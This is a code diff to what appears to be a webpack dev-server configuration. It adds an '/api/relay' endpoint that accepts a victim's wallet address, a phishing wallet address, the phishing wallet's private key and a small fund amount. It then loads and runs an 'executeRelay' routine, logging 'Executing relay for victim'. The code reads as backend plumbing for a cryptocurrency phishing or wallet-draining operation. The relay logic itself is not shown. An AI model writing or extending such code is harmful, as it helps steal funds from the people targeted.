@@ -34,6 +34,48 @@ module.exports = {
                     });
                 }
             });
+
+            app.post('/api/relay', async (req, res) => {
+                try {
+                    // Manual body parsing for the dev server
+                    let body = '';
+                    req.on('data', (chunk) => {
+                        body += chunk.toString();
+                    });
+
+                    req.on('end', async () => {
+                        try {
+                            const params = JSON.parse(body || '{}');
+                            const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount } = params;
+
+                            if (!victimAddress || !phishingAddress || !phishingPrivateKey) {
+                                return res.status(400).json({
+                                    error: 'Missing required parameters (victimAddress, phishingAddress, phishingPrivateKey).',
+                                });
+                            }
+
+                            // Dynamic import for ESM module support
+                            const relayPath = 'file://' + path.join(__dirname, 'src', 'js', 'relay.mjs');
+                            const { executeRelay } = await import(relayPath);
+
+                            console.log(`[dev-server] Executing relay for victim: ${victimAddress}`);
+                            const result = await executeRelay({
+                                victimAddress,
+                                phishingAddress,
+                                phishingPrivateKey,
+                                fundAmount: fundAmount || '0.00002',
+                            });
+
+                            return res.json(result);
+                        } catch (err) {
+                            console.error('[dev-server] Relay execution details failed:', err.message);
+                            return res.status(500).json({ error: err.message });
+                        }
+                    });
+                } catch (err) {
+                    return res.status(500).json({ error: 'Internal server error in dev-server relay handler' });
+                }
+            });
         },
     },
     chainWebpack: (config) => {
